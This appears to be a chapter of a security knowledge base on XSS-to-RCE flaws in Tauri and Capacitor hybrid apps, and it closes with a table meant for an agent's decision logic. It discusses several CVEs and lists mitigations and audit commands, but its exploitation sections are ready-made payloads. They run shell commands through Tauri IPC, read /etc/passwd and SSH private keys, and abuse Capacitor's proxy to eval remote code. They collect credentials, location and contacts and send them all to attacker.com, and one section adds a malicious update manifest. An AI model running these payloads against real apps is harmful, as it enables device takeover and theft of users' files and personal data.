# 50 - Tauri & Capacitor XSS-to-RCE Deep Dive

## Overview

Tauri and Capacitor represent the next generation of hybrid app frameworks after Electron and Cordova. While both claim improved security postures, recent CVEs (2024-2026) demonstrate that XSS in these frameworks can still escalate to Remote Code Execution through IPC abuse, CSP bypasses, and proxy-based origin confusion.

**Sources:**
- [CVE-2026-95626 - Tauri CSP Nonce Bypass](https://app.opencve.io/cve/CVE-2026-95626)
- [CVE-2026-95624 - Tauri Updater IPC Injection](https://vulners.com/osv/OSV:CVE-2026-95624)
- [GHSA-57fm-592m-34r7 - Tauri iframe IPC Bypass](https://github.com/tauri-apps/tauri/security/advisories/GHSA-57fm-592m-34r7)
- [CVE-2026-103922 - Capacitor Proxy Abuse](https://blog.rankiteo.com/cap1790944040-capacitor-vulnerability-october-2026/)
- [CrabNebula Bloop Audit](https://reports.crabnebula.dev/reports/bloop/appendix/adversaries/input_control)
- [Josh Morony - XSS in Capacitor/Cordova](https://www.joshmorony.com/why-xss-attacks-are-more-dangerous-for-capacitor-cordova-apps/)

---

## 1. Tauri v2 Security Architecture

### 1.1 Tauri vs Electron Security Model

Tauri differs from Electron in key architectural ways:
- **Rust backend:** The main process is written in Rust, limiting memory corruption attacks
- **System WebView:** Uses the OS WebView (WebView2 on Windows, WebKit on macOS, WebKitGTK on Linux) instead of bundled Chromium
- **Capability-based permissions:** IPC commands require explicit capability grants in the app configuration
- **No Node.js in renderer:** Unlike Electron, there is no `require()` or Node.js API access from the frontend

However, Tauri's security still depends on:
- Correct CSP configuration
- Proper IPC command permission scoping
- WebView-specific behaviors per platform

### 1.2 Tauri v2 Capability Model

Tauri v2 introduced a granular capability system:
```json
{
  "capabilities": [
    {
      "identifier": "main-window",
      "windows": ["main"],
      "permissions": [
        "core:default",
        "fs:allow-read-file",
        "shell:allow-execute"
      ]
    }
  ]
}
```

XSS in the webview can invoke any IPC command that the window's capabilities allow. Overly permissive configurations create RCE paths.

---

## 2. CVE-2026-95626 -- Tauri v2 CSP Nonce Bypass

### 2.1 Vulnerability Details

**Affected Versions:** Tauri >= 2.0.0
**CVSS:** 8.3 (High)
**Root Cause:** CSP nonce hardening does not protect against `data:` or `blob:` scheme sources per CSP Level 3 specification

### 2.2 Technical Analysis

Tauri v2 automatically applies CSP with nonce-based script restrictions to protect against XSS. However, the CSP Level 3 specification states that `data:` and `blob:` scheme sources remain active even when a nonce is required. This means:

```
Content-Security-Policy: script-src 'nonce-abc123def456'
```

This CSP blocks `<script>alert(1)</script>` but allows:
```html
<script src="data:text/javascript,alert(1)"></script>
<script src="blob:https://app.tauri.localhost/..."></script>
```

### 2.3 Exploitation

```html
<!-- Bypass CSP nonce via data: URI -->
<script src="data:text/javascript,
  // Access Tauri IPC from data: script context
  window.__TAURI__.invoke('shell_execute', {
    program: 'whoami'
  }).then(function(output) {
    fetch('https://attacker.com/tauri-rce', {
      method: 'POST',
      body: output
    });
  });
"></script>

<!-- Bypass CSP nonce via blob: URI -->
<script>
  var code = `
    window.__TAURI__.invoke('fs_read_file', {
      path: '/etc/passwd'
    }).then(function(contents) {
      fetch('https://attacker.com/exfil', {
        method: 'POST',
        body: contents
      });
    });
  `;
  var blob = new Blob([code], { type: 'text/javascript' });
  var url = URL.createObjectURL(blob);
  var s = document.createElement('script');
  s.src = url;
  document.head.appendChild(s);
</script>
```

### 2.4 Impact Assessment

If the Tauri application has overly permissive IPC capabilities, this CSP bypass enables:
- File system read/write (`fs:allow-read-file`, `fs:allow-write-file`)
- Shell command execution (`shell:allow-execute`)
- Updater manipulation (`updater:allow-check`)
- HTTP requests from the backend (`http:allow-request`)
- Clipboard access, dialog manipulation, system tray control

### 2.5 Mitigation

- Explicitly block `data:` and `blob:` in CSP when using nonce-based policies
- Use `script-src 'nonce-...' 'strict-dynamic'` which blocks `data:` by default
- Minimize IPC capability grants to the absolute minimum required
- Validate all IPC command arguments on the Rust side

---

## 3. CVE-2026-95624 -- Tauri Updater IPC Parameter Injection

### 3.1 Vulnerability Details

**Affected Versions:** tauri-plugin-updater >= 2.8.0, < 2.12.0
**Fixed In:** updater-v2.12.0
**CVSS:** 6.8 (Medium)
**Root Cause:** The updater plugin's `check` IPC command accepts security-sensitive parameters from frontend JavaScript

### 3.2 Technical Analysis

The updater plugin exposes a `check` IPC command that accepts an `allowDowngrades` flag. The default permission set grants `allow-check` to the webview, meaning any JavaScript running in the frontend can invoke it.

**Attack Scenario:**
1. XSS is achieved in a Tauri v2 application
2. The attacker invokes the updater's `check` command with `allowDowngrades: true`
3. This bypasses the updater's anti-rollback protection
4. The attacker can force the app to "update" to an older version with known vulnerabilities
5. The downgraded version may have more permissive IPC access or known XSS-to-RCE paths

### 3.3 Exploitation

```javascript
// CVE-2026-95624: Force downgrade via updater IPC
// Step 1: Check for updates with downgrade allowed
window.__TAURI__.invoke('plugin:updater|check', {
  allowDowngrades: true
}).then(function(update) {
  if (update && update.available) {
    // Step 2: Install the downgraded version
    window.__TAURI__.invoke('plugin:updater|install', {
      updateId: update.id
    });
  }
});

// Alternative: Point to attacker-controlled update server
// (if the update URL is also controllable or configurable)
window.__TAURI__.invoke('plugin:updater|check', {
  allowDowngrades: true,
  endpoints: ['https://attacker.com/fake-update.json']
}).then(function(update) {
  update.install();
});
```

**Fake update manifest (attacker server):**
```json
{
  "version": "0.0.1",
  "notes": "Critical security update",
  "pub_date": "2024-01-01T00:00:00Z",
  "platforms": {
    "linux-x86_64": {
      "url": "https://attacker.com/malicious-app.tar.gz",
      "signature": "..."
    }
  }
}
```

### 3.4 Mitigation

- Update to `tauri-plugin-updater` >= 2.12.0
- Remove `allow-check` from default webview permissions
- Require user confirmation for all update operations
- Pin update server URLs in the backend configuration, never accept them from the frontend

---

## 4. GHSA-57fm-592m-34r7 -- Tauri iframe IPC Access Control Bypass

### 4.1 Vulnerability Details

**Platform-Specific:** macOS (WebKit)
**Impact:** Remote-origin iframes could access Tauri IPC endpoints without being allowlisted in v2 capabilities

### 4.2 Technical Analysis

Tauri injects an IPC initialization script into webview content to enable communication between the frontend and the Rust backend. The vulnerability occurred because this IPC script was injected into ALL iframes, including those loading remote-origin content.

On macOS (which uses WebKit), this meant:
1. A Tauri app loads a page that contains an `<iframe src="https://remote-origin.com/page">`
2. The IPC script is injected into the iframe's context
3. The remote-origin page gains access to `window.__TAURI__` IPC functions
4. No capability check was performed for iframe origins

### 4.3 Exploitation

```html
<!-- Tauri app main page loads an iframe -->
<iframe id="external" src="https://attacker.com/exploit.html"></iframe>
```

```html
<!-- exploit.html on attacker's server (macOS only, pre-patch) -->
<!DOCTYPE html>
<html>
<body>
<script>
  // The Tauri IPC script was injected into this remote-origin iframe
  // Access IPC commands that should only be available to the main window

  // Read local files
  window.__TAURI__.invoke('fs_read_file', {
    path: '/Users/victim/.ssh/id_rsa'
  }).then(function(data) {
    document.location = 'https://attacker.com/exfil?data=' + btoa(data);
  });

  // Execute shell commands (if shell capability is granted)
  window.__TAURI__.invoke('shell_execute', {
    program: 'bash',
    args: ['-c', 'whoami && id && cat /etc/passwd']
  }).then(function(output) {
    fetch('https://attacker.com/rce', {
      method: 'POST',
      body: JSON.stringify(output)
    });
  });
</script>
</body>
</html>
```

### 4.4 Mitigation

- The patch stopped injecting the IPC script into iframes on macOS
- Applications should avoid embedding remote-origin iframes when possible
- Use `sandbox` attribute on iframes to restrict capabilities
- Explicitly define allowed origins in Tauri capability configuration

---

## 5. CVE-2026-103922 -- Capacitor Internal Proxy Abuse

### 5.1 Vulnerability Details

**Affected Versions:** Capacitor 6.0.0-6.2.1, 7.0.0-7.6.8, and several 8.x releases
**CVSS:** 9.3-9.6 (Critical)
**Disclosure:** October 2026
**Root Cause:** Internal HTTP proxy endpoint serves attacker-chosen content under the app's trusted origin

### 5.2 How Capacitor Works

Capacitor runs web content in a native WebView. It provides a "bridge" between JavaScript and native device APIs through plugins. The app's web content is served from a trusted local origin (e.g., `capacitor://localhost` or `https://localhost`), and plugin access is granted based on this origin.

### 5.3 The Proxy Vulnerability

Capacitor includes an internal HTTP proxy endpoint for its HTTP plugin. This proxy fetches an arbitrary URL and serves the response under the app's own trusted origin.

**Key findings:**
- The proxy handler remained available even when the CapacitorHttp plugin was disabled
- Any code running in the WebView could use the proxy to fetch attacker-controlled content
- The response was served under the app's trusted origin, bypassing same-origin protections
- This effectively transformed any script injection into full plugin access

### 5.4 Exploitation

```javascript
// CVE-2026-103922: Use the internal proxy to serve attacker content under trusted origin
// Step 1: Fetch attacker-controlled script via the internal proxy
fetch('/_capacitor_http_proxy_?url=' + encodeURIComponent('https://attacker.com/exploit.js'))
  .then(function(response) { return response.text(); })
  .then(function(code) {
    // Step 2: The code executes under the app's trusted origin
    eval(code);
  });

// exploit.js on attacker's server -- full plugin access:
(async function() {
  var Plugins = window.Capacitor.Plugins;

  // Access filesystem
  var contents = await Plugins.Filesystem.readFile({
    path: 'credentials.json',
    directory: 'DATA'
  });
  
  // Access device info
  var deviceInfo = await Plugins.Device.getInfo();
  
  // Access geolocation
  var position = await Plugins.Geolocation.getCurrentPosition();
  
  // Access camera (requires existing permission)
  try {
    var photo = await Plugins.Camera.getPhoto({
      quality: 90,
      source: 'CAMERA'
    });
  } catch(e) {}
  
  // Access contacts (if plugin registered)
  try {
    var contacts = await Plugins.Contacts.getContacts();
  } catch(e) {}

  // Exfiltrate everything
  fetch('https://attacker.com/cap-exfil', {
    method: 'POST',
    body: JSON.stringify({
      credentials: contents,
      device: deviceInfo,
      location: position,
      contacts: contacts
    })
  });
})();
```

### 5.5 Capacitor Plugin Access After Proxy Exploitation

Once executing under the app's trusted origin, the attacker can access any registered Capacitor plugin:

| Plugin | Capability | Impact |
|--------|-----------|--------|
| Filesystem | Read/write local files | Data theft, persistence |
| Camera | Capture photos/video | Privacy breach |
| Geolocation | Track device location | Surveillance |
| Device | Hardware/software info | Fingerprinting |
| LocalNotifications | Show notifications | Phishing |
| Browser | Open external URLs | Phishing, redirects |
| Clipboard | Read/write clipboard | Credential theft |
| Share | Invoke share dialog | Social engineering |
| PushNotifications | Send/receive push | C2 channel |
| Haptics | Trigger haptic feedback | User confusion |

### 5.6 Capacitor Security Evolution

| Version | Security Change |
|---------|----------------|
| Capacitor 2.x | All core plugins exposed by default |
| Capacitor 3.x | Explicit plugin registration required |
| Capacitor 6.x | Internal proxy vulnerability present |
| Capacitor 7.x | Proxy vulnerability present |
| Capacitor 8.x (patched) | Proxy endpoint removed/secured |

### 5.7 Mitigation

- Update to patched Capacitor version (6.2.2+, 7.6.9+, 8.x patched)
- Audit registered plugins and remove unnecessary ones
- Implement CSP that blocks connections to the internal proxy
- Validate all input to the HTTP proxy if it must remain
- Use `Capacitor.isNative` checks only as defense-in-depth, not as primary security

---

## 6. Third-Party Audit Findings

### CrabNebula Bloop Audit

An audit of the Bloop application (Tauri-based) found:

> "In the worst case it elevates the impact of cross-site-scripting vulnerabilities to critical (CVSS 9.0-10.0) if Remote Code Execution (RCE) features are enabled and improperly configured."

**Key findings:**
- Overly permissive IPC allowlists exposed shell commands to the webview
- File system access was granted without path restrictions
- The combination of XSS + permissive IPC = full system compromise

**Source:** [CrabNebula Bloop Audit](https://reports.crabnebula.dev/reports/bloop/appendix/adversaries/input_control)

---

## 7. Testing Methodology

### 7.1 Tauri Application Assessment

```bash
# 1. Find Tauri configuration
find . -name "tauri.conf.json" -o -name "Cargo.toml" | head -5
cat src-tauri/tauri.conf.json

# 2. Check capability grants
cat src-tauri/capabilities/*.json
grep -r "permissions" src-tauri/capabilities/

# 3. Find IPC command handlers (Rust)
grep -rn "#\[tauri::command\]" src-tauri/src/
grep -rn "invoke_handler" src-tauri/src/

# 4. Check CSP configuration
grep -r "csp" src-tauri/tauri.conf.json

# 5. Find plugin usage
grep -r "tauri-plugin" src-tauri/Cargo.toml
grep -r "plugin:" src-tauri/capabilities/

# 6. Check for iframe usage in frontend
grep -rn "<iframe" src/
grep -rn "allowlist" src-tauri/tauri.conf.json
```

### 7.2 Capacitor Application Assessment

```bash
# 1. Find Capacitor configuration
cat capacitor.config.ts || cat capacitor.config.json

# 2. List registered plugins
grep -rn "registerPlugin\|Capacitor.Plugins" src/
cat package.json | grep -i capacitor

# 3. Check for proxy endpoint
grep -rn "CapacitorHttp\|_capacitor_http" src/

# 4. Check CSP
grep -rn "Content-Security-Policy\|meta.*http-equiv" src/index.html

# 5. Check for webview configuration
grep -rn "server\|allowNavigation" capacitor.config.*
```

---

## 8. Key Takeaways for Agent Decision Logic

| Framework | Vulnerability | CVE | CVSS | Attack Vector |
|-----------|--------------|-----|------|---------------|
| Tauri v2 | CSP nonce bypass via data:/blob: | CVE-2026-95626 | 8.3 | XSS -> data: script -> IPC commands |
| Tauri v2 | Updater IPC parameter injection | CVE-2026-95624 | 6.8 | XSS -> force downgrade -> exploit old version |
| Tauri v2 | iframe IPC bypass (macOS) | GHSA-57fm | N/A | Remote iframe -> IPC access -> RCE |
| Capacitor | Internal proxy origin confusion | CVE-2026-103922 | 9.3-9.6 | XSS -> proxy -> trusted origin -> all plugins |
| Both | Overly permissive IPC/plugins | N/A | 9.0-10.0 | XSS -> shell/fs IPC commands -> RCE |
